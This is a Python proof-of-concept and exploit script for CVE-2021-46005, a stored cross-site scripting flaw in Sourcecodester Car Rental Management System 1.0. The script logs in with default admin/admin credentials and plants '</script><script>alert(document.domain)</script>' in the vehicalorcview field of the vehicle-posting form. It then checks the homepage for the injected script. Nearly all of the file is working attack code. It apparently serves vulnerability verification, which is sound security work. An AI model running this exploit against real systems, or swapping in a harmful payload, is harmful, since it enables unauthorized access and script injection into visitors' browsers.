import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting''',
        "description": '''Sourcecodester Car Rental Management System 1.0 is vulnerable to cross-site scripting via the vehicalorcview parameter.''',
        "severity": "medium",
        "references": [
            "https://www.exploit-db.com/exploits/49546", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-46005"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-46005",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2021/CVE-2021-46005/vultarget"
        },
        "tags": ["cve", "cve2021", "xss", "sourcecodester", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    resp = requests.get(url, timeout=10, verify=False)
    if "<title>Car Rental Portal</title>" in resp.text:
        return True
    else:
        return False

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/admin/"""
        method = "POST"
        data = """username={username}&password={password}&login=""".format(username=username, password=password)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'close'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False)
        path = """/admin/post-avehical.php"""
        method = "POST"
        data = """------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="vehicletitle"

Test
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="brandname"

1
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="vehicalorcview"

</script><script>alert(document.domain)</script>
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="priceperday"

500
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="fueltype"

Petrol
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="modelyear"

2022
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="seatingcapacity"

5
------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img1"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img2"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img3"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img4"; filename="test.png"
Content-Type: image/png


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="img5"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarypWqYipqU21aYgccv
Content-Disposition: form-data; name="submit"


------WebKitFormBoundarypWqYipqU21aYgccv--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarypWqYipqU21aYgccv'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp2 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""</script><script>alert(document.domain)</script>""" in resp2.text) and ("""text/html""" in str(resp2.headers)) and (resp2.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url